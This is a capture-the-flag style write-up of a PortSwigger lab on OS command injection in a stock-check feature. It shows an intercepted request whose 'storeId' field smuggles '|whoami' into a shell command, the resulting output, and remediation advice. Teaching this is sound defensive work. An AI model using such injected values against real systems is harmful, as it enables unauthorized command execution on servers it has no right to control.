# 💻 OS Command Injection — Simple Case

**🧠 Difficulty:** Apprentice
**📚 Platform:** PortSwigger Web Security Academy
**👩‍💻 Author:** Kaouthar Belkebir

---

## 📌 Lab Description

> This lab contains an **OS command injection vulnerability** in the product stock checker.
>
> The application executes a shell command containing **user-supplied product and store IDs**, and returns the **raw output from the command** in its HTTP response.
>
> ✅ **Goal:** Execute the `whoami` command to determine the name of the current user on the server.

---

## 🔍 Vulnerability Summary

The target web app provides a feature to check **stock levels** using two parameters:

* `productId`
* `storeId`

These values are **directly injected into a shell command**, allowing command injection via special characters like `|`.

---

## 🧪 Exploitation Steps

1. Open the stock check page and intercept the request using **Burp Suite**.
2. Modify the request to inject a command into the `storeId` parameter.

---

### 📥 Intercepted Request

```http
POST /product/stock HTTP/2
Host: [LAB_DOMAIN]
Cookie: session=AzKPSTrcJ3Ggw3i8rXP3JFzMDf7ecgXc
Content-Type: application/x-www-form-urlencoded

productId=3&storeId=2|whoami
```

---

### ✅ Result

The server response includes:

```
www-data
```

💥 This confirms **successful OS command execution**. The user running the process is `www-data`.

---

## 🔬 Root Cause

* The server builds a shell command using `productId` and `storeId` **without sanitization**.
* By injecting `|whoami`, the attacker **chains a second command**, executed by the system shell.

---

## 🛡️ Remediation

* ❌ **Don’t use user input in shell commands.**
* ✅ Use safe APIs like `subprocess.run(..., shell=False)` (Python), or equivalents in other languages.
* ✅ Validate and sanitize input. Apply strict allow-listing.

---

## 🧠 Key Takeaway

Even **simple user inputs** like an ID can become dangerous when directly passed to system-level functions.
This lab proves that without input validation, an attacker can easily **take control of system-level execution** using a single parameter injection.

---

## 🖼️ Screenshot

https://github.com/Kabilala/OS-command-injection/blob/main/lab1/lab1.png
-
